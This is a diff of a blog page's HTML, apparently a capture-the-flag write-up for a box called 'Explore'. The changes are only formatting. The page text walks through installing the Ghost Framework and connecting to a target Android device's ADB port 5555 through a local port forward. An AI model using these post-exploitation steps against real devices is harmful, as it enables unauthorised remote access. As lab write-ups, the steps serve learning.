 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">su root
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">su root
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p><img src="https://netuserdoomdesire.github.io/Explore/8.png" alt="Pasted image 20210627133103.png"></p>
 <h1 id="exploring-ghost-framework"><a href="#exploring-ghost-framework" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>Exploring Ghost Framework</h1>
 <p>Searching around the Internet, i came across a very intersting tool, called <strong>Ghost Framework</strong>, an &ldquo;Android post-exploitation framework that exploits the Android Debug Bridge to remotely access an Android device&rdquo;. First we need to dowload it with:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">pip3 install git+https://github.com/EntySec/Ghost
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pip3 install git+https://github.com/EntySec/Ghost
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>The we can run it with:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">ghost
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ghost
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>This will open the Ghost Framework, where we can enter <code>help</code> to see our available options:</p>
 <p><img src="https://netuserdoomdesire.github.io/Explore/9.png" alt="Pasted image 20210705053951.png"></p>
 <p>All we need to do is connect to the device. We have already port forwarded our traffic from our local port 6666 to the port 5555 of the target, so we are going to connect to <strong>localhost:6666</strong> with:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">connect localhost:6666
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">connect localhost:6666
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>We can then also type <code>help</code> to see our options:</p>
 <p><img src="https://netuserdoomdesire.github.io/Explore/10.png" alt="Pasted image 20210705054135.png"></p>
@@ -700,7 +700,7 @@ tcp6       <span class="m">0</span>      <span class="m">0</span> :::5555       
 
         
     <div class="updated-badge-container">
-        <span title="Updated @ 2021-10-30 11:06:20 EEST" style="cursor:help">
+        <span title="Updated @ 2021-10-30 11:06:20 &#43;03" style="cursor:help">
 
 <svg xmlns="http://www.w3.org/2000/svg" width="130" height="20" class="updated-badge"><linearGradient id="b" x2="0" y2="100%"><stop offset="0" stop-color="#bbb" stop-opacity=".1"/><stop offset="1" stop-opacity=".1"/></linearGradient><clipPath id="a"><rect width="130" height="20" rx="3" fill="#fff"/></clipPath><g clip-path="url(#a)"><path class="updated-badge-left" d="M0 0h55v20H0z"/><path class="updated-badge-right" d="M55 0h75v20H55z"/><path fill="url(#b)" d="M0 0h130v20H0z"/></g><g fill="#fff" text-anchor="middle" font-size="110"><text x="285" y="150" fill="#010101" fill-opacity=".3" textLength="450" transform="scale(.1)">updated</text><text x="285" y="140" textLength="450" transform="scale(.1)">updated</text><text x="915" y="150" fill="#010101" fill-opacity=".3" textLength="650" transform="scale(.1)">2021-10-30</text><text x="915" y="140" textLength="650" transform="scale(.1)">2021-10-30</text></g></svg>
         </span></div>
@@ -850,7 +850,7 @@ tcp6       <span class="m">0</span>      <span class="m">0</span> :::5555       
             
     <footer id="footer" class="footer">
         <div class="footer-inner">
-            <div class="site-info">©&nbsp;2021–2021&nbsp;<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon footer-icon"><path d="M462.3 62.6C407.5 15.9 326 24.3 275.7 76.2L256 96.5l-19.7-20.3C186.1 24.3 104.5 15.9 49.7 62.6c-62.8 53.6-66.1 149.8-9.9 207.9l193.5 199.8c12.5 12.9 32.8 12.9 45.3 0l193.5-199.8c56.3-58.1 53-154.3-9.8-207.9z"/></svg>&nbsp;Doomdesire</div><div class="site-copyright"></div>
+            <div class="site-info">©&nbsp;2021–2023&nbsp;<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon footer-icon"><path d="M462.3 62.6C407.5 15.9 326 24.3 275.7 76.2L256 96.5l-19.7-20.3C186.1 24.3 104.5 15.9 49.7 62.6c-62.8 53.6-66.1 149.8-9.9 207.9l193.5 199.8c12.5 12.9 32.8 12.9 45.3 0l193.5-199.8c56.3-58.1 53-154.3-9.8-207.9z"/></svg>&nbsp;Doomdesire</div><div class="site-copyright"></div>
 
             
     
